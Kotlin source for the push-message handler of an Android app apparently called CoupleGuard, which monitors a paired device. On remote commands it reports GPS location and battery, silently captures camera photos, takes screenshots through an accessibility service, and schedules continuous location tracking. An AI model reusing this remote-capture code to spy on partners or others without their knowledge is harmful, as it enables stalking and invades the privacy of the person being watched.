package com.example.couple_guard_child.fcm

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.example.couple_guard_child.services.CameraBackgroundService
import com.example.couple_guard_child.services.MyAccessibilityService
import com.example.couple_guard_child.services.background.ScreenCaptureForegroundService
import com.example.couple_guard_child.utils.ApiClient
import com.example.couple_guard_child.workers.LocationWorkManager
import com.google.android.gms.location.*
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await

class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFCMService"
        private const val WAKE_LOCK_TIMEOUT = 3 * 60 * 1000L // 3 minutes
    }

    private val scope = CoroutineScope(Dispatchers.IO)
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        Log.d(TAG, "✅ FCM Service created")
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        // ✅ CRITICAL: Acquire wake lock to keep CPU awake
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "CoupleGuard::FCMWakeLock"
        )
        
        try {
            wakeLock.acquire(WAKE_LOCK_TIMEOUT)
            
            Log.d(TAG, "========================================")
            Log.d(TAG, "📨 FCM MESSAGE RECEIVED")
            Log.d(TAG, "From: ${remoteMessage.from}")
            Log.d(TAG, "Data: ${remoteMessage.data}")
            Log.d(TAG, "Time: ${System.currentTimeMillis()}")
            Log.d(TAG, "========================================")

            if (remoteMessage.data.isNotEmpty()) {
                handleCommand(remoteMessage.data)
            } else {
                Log.w(TAG, "⚠️ Empty FCM data")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error handling FCM message", e)
            e.printStackTrace()
        } finally {
            if (wakeLock.isHeld) {
                wakeLock.release()
                Log.d(TAG, "🔓 Wake lock released")
            }
        }
    }

    private fun handleCommand(data: Map<String, String>) {
        val commandType = data["type"] ?: run {
            Log.w(TAG, "⚠️ No command type in FCM data")
            return
        }

        Log.d(TAG, "🎯 Processing command: $commandType")

        // ✅ Check pairing status
        if (!ApiClient.isPaired(applicationContext)) {
            Log.w(TAG, "⚠️ Device not paired, ignoring command")
            return
        }

        when (commandType) {
            "REQUEST_LOCATION" -> {
                Log.d(TAG, "📍 Executing: Request Location")
                requestLocationUpdate()
            }
            
            "CAPTURE_PHOTO" -> {
                Log.d(TAG, "📸 Executing: Capture Photo")
                val useFront = data["front_camera"]?.toBoolean() ?: true
                capturePhoto(useFront)
            }
            
            "SCREEN_CAPTURE" -> {
                Log.d(TAG, "🖥️ Executing: Screen Capture")
                captureScreen()
            }
            
            "START_MONITORING" -> {
                Log.d(TAG, "▶️ Executing: Start Monitoring")
                startMonitoring()
            }
            
            "STOP_MONITORING" -> {
                Log.d(TAG, "⏹️ Executing: Stop Monitoring")
                stopMonitoring()
            }
            
            else -> {
                Log.w(TAG, "⚠️ Unknown command: $commandType")
            }
        }
    }

    /**
     * Request Location Update
     */
    private fun requestLocationUpdate() {
        scope.launch {
            try {
                Log.d(TAG, "Checking location permission...")
                
                // Check permission
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) 
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    Log.e(TAG, "❌ No location permission!")
                    return@launch
                }
                
                Log.d(TAG, "Getting current location...")

                // Get location
                val location = fusedLocationClient.getCurrentLocation(
                    LocationRequest.PRIORITY_HIGH_ACCURACY,
                    null
                ).await()

                if (location != null) {
                    Log.d(TAG, "✅ Location: ${location.latitude}, ${location.longitude}")
                    Log.d(TAG, "Accuracy: ${location.accuracy}m")
                    
                    // Get battery level
                    val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                    val batteryLevel = batteryManager.getIntProperty(
                        android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY
                    )
                    
                    Log.d(TAG, "🔋 Battery: $batteryLevel%")
                    
                    // Send to server
                    val success = ApiClient.sendLocation(
                        applicationContext,
                        location.latitude,
                        location.longitude,
                        batteryLevel
                    )
                    
                    if (success) {
                        Log.d(TAG, "✅ Location sent successfully via FCM")
                    } else {
                        Log.e(TAG, "❌ Failed to send location")
                    }
                } else {
                    Log.e(TAG, "❌ Location is null")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to get location", e)
                e.printStackTrace()
            }
        }
    }

    /**
     * Capture Photo
     */
    private fun capturePhoto(useFrontCamera: Boolean) {
        try {
            // Check camera permission
            if (checkSelfPermission(android.Manifest.permission.CAMERA) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "❌ No camera permission")
                return
            }
            
            Log.d(TAG, "Starting camera service...")
            Log.d(TAG, "Camera type: ${if (useFrontCamera) "front" else "back"}")
            
            // ✅ Use foreground service for reliability
            CameraBackgroundService.startCapture(applicationContext, useFrontCamera)
            
            Log.d(TAG, "✅ Camera service started")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start camera service", e)
            e.printStackTrace()
        }
    }

    /**
     * Capture Screen
     */
    private fun captureScreen() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Log.d(TAG, "Using Accessibility Service method")    
                    val instance = MyAccessibilityService.instance
                        if (instance != null) {
                            instance.takeScreenshot()
                            Log.d(TAG, "✅ Screenshot request sent to AccessibilityService")
                        } else {
                            Log.e(TAG, "❌ AccessibilityService not available")
                            Log.e(TAG, "User needs to enable accessibility service in Settings")
                        }
                    } else {
                        Log.e(TAG, "❌ Accessibility screenshot requires Android 11+")
                    }   
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to capture screen", e)
            e.printStackTrace()
        }
    }

    /**
     * Start Monitoring
     */
    private fun startMonitoring() {
        try {
            Log.d(TAG, "Starting monitoring services...")
            
            // 1. Start location tracking
            LocationWorkManager.schedulePeriodicLocationUpdates(applicationContext)
            Log.d(TAG, "✅ Location tracking started")
            
            // 2. Start background service
            val serviceIntent = Intent(
                applicationContext,
                id.flutter.flutter_background_service.BackgroundService::class.java
            )
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(serviceIntent)
            } else {
                applicationContext.startService(serviceIntent)
            }
            
            Log.d(TAG, "✅ Background service started")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start monitoring", e)
        }
    }

    /**
     * Stop Monitoring
     */
    private fun stopMonitoring() {
        try {
            Log.d(TAG, "Stopping monitoring services...")
            
            // Stop location tracking
            LocationWorkManager.cancelPeriodicLocationUpdates(applicationContext)
            
            Log.d(TAG, "✅ Monitoring stopped")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to stop monitoring", e)
        }
    }

    /**
     * Update FCM Token
     */
    override fun onNewToken(token: String) {
        Log.d(TAG, "========================================")
        Log.d(TAG, "🔄 NEW FCM TOKEN RECEIVED")
        Log.d(TAG, "Token: ${token.substring(0, 20)}...")
        Log.d(TAG, "========================================")
        
        // Save token to SharedPreferences
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        prefs.edit().putString("flutter.fcm_token", token).apply()
        
        // Send to server
        sendTokenToServer(token)
    }

    private fun sendTokenToServer(token: String) {
        scope.launch {
            try {
                val success = ApiClient.updateFcmToken(applicationContext, token)
                
                if (success) {
                    Log.d(TAG, "✅ FCM token sent to server")
                } else {
                    Log.e(TAG, "❌ Failed to send token to server")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Exception sending token", e)
            }
        }
    }
}